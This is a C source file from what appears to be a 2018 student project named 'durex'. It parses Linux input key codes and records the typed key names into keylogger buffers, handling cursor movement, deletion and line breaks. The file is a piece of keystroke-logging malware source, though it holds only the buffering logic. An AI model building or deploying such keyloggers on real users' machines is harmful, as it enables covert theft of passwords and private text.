/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   keylog_parse.c                                     :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mdufaud <mdufaud@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/05/20 18:32:14 by mdufaud           #+#    #+#             */
/*   Updated: 2018/05/20 19:28:36 by mdufaud          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"
#include <linux/input.h>

static const t_keylog_code		g_codes[] = {
	{KEY_HOME, keylog_home},
	{KEY_END, keylog_home},
	{KEY_LEFT, keylog_keys},
	{KEY_RIGHT, keylog_keys},
	{KEY_DELETE, keylog_del},
	{KEY_BACKSPACE, keylog_del},
	{KEY_ENTER, keylog_enter},
	{0, NULL}
};

void		keylog_add(t_keylog_buf *kl_buf, t_ull code, const char *name)
{
	int		l;

	l = ft_strlen((char *)name);
	if (l + kl_buf->len >= BUFF_SIZE)
		keylog_enter(kl_buf, code);
	if (kl_buf->index != kl_buf->len)
		ft_memmove(kl_buf->buf + kl_buf->index + l, kl_buf->buf + kl_buf->index,
			kl_buf->len - kl_buf->index);
	ft_strncpy(kl_buf->buf + kl_buf->index, name, l);
	kl_buf->len += l;
	kl_buf->index += l;
}

int			keylog_parse(t_keylog *kl, t_ull code, const char *name)
{
	int		i;
	int		ret;

	i = 0;
	while (g_codes[i].f)
	{
		if (g_codes[i].code == code)
		{
			ret = g_codes[i].f(&kl->kl, code);
			ret = g_codes[i].f(&kl->simple, code);
			return (ret);
		}
		i++;
	}
	if (name && name[0] && !name[1])
		keylog_add(&kl->simple, code, name);
	if (name)
		keylog_add(&kl->kl, code, name);
	return (0);
}
